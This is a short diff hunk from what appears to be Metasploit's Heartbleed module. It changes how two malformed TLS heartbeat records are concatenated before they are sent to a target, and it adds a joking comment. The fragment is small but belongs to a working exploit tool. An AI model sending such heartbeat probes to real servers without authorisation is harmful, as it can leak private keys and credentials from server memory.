@@ -265,7 +265,8 @@ class Metasploit3 < Msf::Auxiliary
 
       vprint_status("#{peer} - Sending Heartbeat...")
       if safe
-        sock.put(heartbeat(max_record_length - 3, safe) << heartbeat(0, safe))
+        # 3 is magical. As you know.
+        sock.put(heartbeat(max_record_length - 3, safe) + heartbeat(0, safe))
       else
         sock.put(heartbeat(heartbeat_length))
       end
